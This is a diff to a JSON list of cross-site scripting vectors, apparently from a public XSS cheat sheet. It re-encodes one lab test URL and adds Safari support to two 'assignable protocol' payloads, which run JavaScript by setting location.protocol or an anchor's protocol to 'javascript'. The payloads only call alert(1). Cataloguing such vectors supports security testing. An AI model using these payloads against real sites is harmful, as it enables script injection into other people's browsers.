@@ -258,16 +258,16 @@
     {
         "description": "Assignable protocol with location",
         "code": "<script>location.protocol='javascript'<\/script>",
-        "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3Elocation.protocol='javascript';%3C\/script%3E#%0aalert(1)//",
+        "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3Elocation.protocol=%27javascript%27;%3C\/script%3E#%0aalert%281%29\/\/",
         "browsers": [
-            "chrome"        
+            "chrome","safari"        
         ]
     },
     {
         "description": "Assignable protocol with anchor",
         "code": "<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test<\/a>",
         "browsers": [
-            "chrome"        
+            "chrome","safari"       
         ]
     }       
 ]
